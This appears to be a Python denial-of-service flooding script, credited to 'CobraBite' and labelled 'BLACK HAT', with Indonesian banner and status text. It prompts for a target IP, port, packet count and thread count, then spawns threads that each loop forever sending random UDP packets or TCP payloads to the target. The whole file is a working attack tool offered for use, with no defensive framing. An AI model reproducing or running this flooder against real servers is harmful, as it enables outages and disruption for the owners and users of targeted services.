import random
import time
import socket
import threading
import os

os.system("clear")
print("Note : Bagi Team Cb Jangan Abuse")
print("Author : CobraBite")
print("Community : https://discord.gg/gspz4pwsv3")
print("Contact : CobraBite#1251")
print("TYPE :   BLACK HAT")
print("YT     :  Nabil Dinandri")
print("TEAM : CobraBite")
ip = str(input(" Ip Target: "))
port = int(input(" Port Target: "))
choice = str(input(" Gas gak ?(y/n): "))
times = int(input(" Packets: "))
threads = int(input(" Threads: "))

os.system("clear")
os.system("figlet Attack Starting")
print ("[                    ] 0% ")
time.sleep(5)
print ("[=====               ] 25%")
time.sleep(5)
print ("[==========          ] 50%")
time.sleep(5)
print ("[===============     ] 75%")
time.sleep(5)
print ("[====================] 100%")
time.sleep(3)
def run():
  data = random._urandom(1024)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +" |##### /Menyerang Server\ #####|")
    except:
      print("[!] |##### /Menyerang Server\ #####|")

def run2():
  data = random._urandom(16)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" Connection Time Out")
    except:
      s.close()
      print("[*] Server Mati ")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()